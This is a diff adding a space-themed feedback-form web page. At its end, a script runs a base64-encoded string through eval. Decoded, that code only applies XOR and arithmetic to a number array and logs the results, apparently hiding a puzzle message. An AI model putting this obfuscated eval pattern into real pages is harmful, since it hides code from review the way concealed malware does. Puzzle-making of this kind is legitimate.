@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Feedback Portal</title>
+    <style>
+        :root {
+            --space-blue: #1a1b4b;
+            --star-white: #ffffff;
+            --cosmic-purple: #4a1b7f;
+            --meteor-orange: #ff6b35;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            background: linear-gradient(135deg, var(--space-blue), var(--cosmic-purple));
+            color: var(--star-white);
+            font-family: 'Arial', sans-serif;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        .star-field {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            pointer-events: none;
+        }
+
+        .star-field::before,
+        .star-field::after {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-image: 
+                radial-gradient(2px 2px at 20px 30px, var(--star-white), rgba(0,0,0,0)),
+                radial-gradient(2px 2px at 40px 70px, var(--star-white), rgba(0,0,0,0)),
+                radial-gradient(2px 2px at 50px 160px, var(--star-white), rgba(0,0,0,0)),
+                radial-gradient(2px 2px at 90px 40px, var(--star-white), rgba(0,0,0,0)),
+                radial-gradient(2px 2px at 130px 80px, var(--star-white), rgba(0,0,0,0)),
+                radial-gradient(2px 2px at 160px 120px, var(--star-white), rgba(0,0,0,0));
+            background-repeat: repeat;
+            background-size: 200px 200px;
+            animation: twinkle 4s linear infinite;
+        }
+
+        .star-field::after {
+            background-size: 300px 300px;
+            animation: twinkle 6s linear infinite;
+        }
+
+        @keyframes twinkle {
+            0% { opacity: 0.5; }
+            50% { opacity: 1; }
+            100% { opacity: 0.5; }
+        }
+
+        .shooting-star {
+            position: fixed;
+            top: 50%;
+            left: 0;
+            width: 100px;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--meteor-orange));
+            animation: shooting 4s linear infinite;
+        }
+
+        .shooting-star:nth-child(2) {
+            top: 30%;
+            animation-delay: -2s;
+        }
+
+        @keyframes shooting {
+            0% {
+                transform: translateX(-100%) rotate(-45deg);
+            }
+            100% {
+                transform: translateX(200%) rotate(-45deg);
+            }
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 2rem;
+            position: relative;
+            z-index: 1;
+        }
+
+        .header {
+            text-align: center;
+            padding: 2rem 0;
+            animation: fade-in 1.5s ease-out;
+        }
+
+        @keyframes fade-in {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .title {
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
+        }
+
+        .subtitle {
+            font-size: 1.2rem;
+            opacity: 0.8;
+        }
+
+        .feedback-form {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 2rem;
+            margin-top: 2rem;
+            animation: slide-up 1s ease-out;
+        }
+
+        @keyframes slide-up {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: bold;
+        }
+
+        input, textarea, select {
+            width: 100%;
+            padding: 0.8rem;
+            border: 2px solid transparent;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.15);
+            color: var(--star-white);
+            font-size: 1rem;
+            transition: all 0.3s ease;
+        }
+
+        input:focus, textarea:focus, select:focus {
+            outline: none;
+            border-color: var(--meteor-orange);
+            box-shadow: 0 0 0 2px rgba(255, 107, 53, 0.3);
+        }
+
+        select {
+            cursor: pointer;
+        }
+
+        select option {
+            background: var(--space-blue);
+            color: var(--star-white);
+        }
+
+        .submit-btn {
+            background: var(--meteor-orange);
+            color: var(--star-white);
+            border: none;
+            padding: 1rem 2rem;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 1.1rem;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .submit-btn::before {
+            content: "";
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(
+                45deg,
+                transparent,
+                rgba(255, 255, 255, 0.3),
+                transparent
+            );
+            transform: rotate(45deg);
+            animation: shine 3s infinite;
+        }
+
+        @keyframes shine {
+            0% { transform: translateX(-100%) rotate(45deg); }
+            100% { transform: translateX(100%) rotate(45deg); }
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(255, 107, 53, 0.4);
+        }
+
+        .planet {
+            position: fixed;
+            border-radius: 50%;
+            pointer-events: none;
+        }
+
+        .planet-1 {
+            width: 100px;
+            height: 100px;
+            top: 10%;
+            right: 5%;
+            background: linear-gradient(45deg, var(--meteor-orange), #ff8c66);
+            opacity: 0.6;
+            animation: float 8s ease-in-out infinite;
+        }
+
+        .planet-2 {
+            width: 150px;
+            height: 150px;
+            bottom: 5%;
+            left: 10%;
+            background: linear-gradient(45deg, var(--cosmic-purple), #6b2bb8);
+            opacity: 0.6;
+            animation: float 12s ease-in-out infinite reverse;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-20px); }
+        }
+    </style>
+</head>
+<body>
+    <div class="star-field"></div>
+    <div class="shooting-star"></div>
+    <div class="shooting-star"></div>
+    <div class="planet planet-1"></div>
+    <div class="planet planet-2"></div>
+    
+    <div class="container">
+        <header class="header">
+            <h1 class="title">Cosmic Feedback Portal</h1>
+            <p class="subtitle">Your thoughts matter across the universe</p>
+        </header>
+
+        <form class="feedback-form" action="/submit-feedback" method="POST">
+            <div class="form-group">
+                <label for="name">Cosmic Navigator Name</label>
+                <input type="text" id="name" name="name" required>
+            </div>
+
+            <div class="form-group">
+                <label for="email">Stellar Communication Channel (Email)</label>
+                <input type="email" id="email" name="email" required>
+            </div>
+
+            <div class="form-group">
+                <label for="category">Space Sector</label>
+                <select id="category" name="category" required>
+                    <option value="">Select a category</option>
+                    <option value="feature">New Feature Suggestion</option>
+                    <option value="bug">Anomaly Report</option>
+                    <option value="improvement">Enhancement Proposal</option>
+                    <option value="other">Other Cosmic Matters</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label for="message">Your Cosmic Message</label>
+                <textarea id="message" name="message" rows="5" required></textarea>
+            </div>
+
+            <button type="submit" class="submit-btn">Launch Feedback</button>
+        </form>
+    </div>
+    <script>
+        <!-- Not so useful JS. While in space, I dont like to code in JS -->
+        (function(){
+            const code = "Y29uc3QgbG9uZ2xpc3QgPSBbMTMyLCA1NiwgMTI0LCAxMDksIDU2LCAxMjMsIDEyNCwgMTA0LCA1OCwgNzMsIDEwMiwgMTIyLCA1NiwgMTAyLCA1OCwgMTA2LCA1OSwgMTE5LCA2MCwgMTMwLCA3NywgOTEsIDc0LCA4MiwgNzRdOwpjb25zdCBiYWNrZ3JvdW5kID0gKCkgPT4gewogICAgbGV0IGludGVybWVkaWF0ZUFycmF5ID0gW107CiAgICBsZXQgbGlzdCA9ICIiOwogICAgbG9uZ2xpc3QuZm9yRWFjaCgoY2hhciwgaW5kZXgpID0+IHsKICAgICAgICBpbnRlcm1lZGlhdGVBcnJheVtpbmRleF0gPSBjaGFyIF4gKGluZGV4ICUgNSk7CiAgICB9KTsKICAgIGNvbnN0IGFkZGl0aW9uYWxQcm9jZXNzaW5nID0gaW50ZXJtZWRpYXRlQXJyYXkubWFwKChjaGFyLCBpbmRleCkgPT4gewogICAgICAgIHJldHVybiAoY2hhciAqIDMgKyA1IC0gaW5kZXgpICUgMjU2OwogICAgfSk7CiAgICBhZGRpdGlvbmFsUHJvY2Vzc2luZy5mb3JFYWNoKGNoYXIgPT4gewogICAgICAgIGlmIChjaGFyID49IDMyICYmIGNoYXIgPD0gMTI2KSB7CiAgICAgICAgICAgIGxpc3QgKz0gU3RyaW5nLmZyb21DaGFyQ29kZShjaGFyKTsKICAgICAgICB9CiAgICB9KTsKICAgIGNvbnNvbGUubG9nKCJEZWJ1ZyBpbmZvOiIsIGludGVybWVkaWF0ZUFycmF5KTsKICAgIGNvbnNvbGUubG9nKCJQcm9jZXNzZWQgYXJyYXk6IiwgYWRkaXRpb25hbFByb2Nlc3NpbmcpOwogICAgY29uc29sZS5sb2cobGlzdCk7Cn07CmNvbnN0IHJ1bm5lciA9ICgpID0+IHsKICAgIGxldCBsaXN0ID0gIiI7CiAgICBsb25nbGlzdC5mb3JFYWNoKGNoYXIgPT4gewogICAgICAgIGNoYXIgLT0gNzsKICAgICAgICBsaXN0ICs9IFN0cmluZy5mcm9tQ2hhckNvZGUoY2hhcik7CiAgICB9KTsKICAgIGxpc3QgPSBsaXN0LnNwbGl0KCcnKS5yZXZlcnNlKCkuam9pbignJyk7CiAgICBjb25zb2xlLmxvZyhsaXN0KTsKfTsKYmFja2dyb3VuZCgpOw=="
+            eval(atob(code));
+        })();
+    </script>
+</body>
+</html>
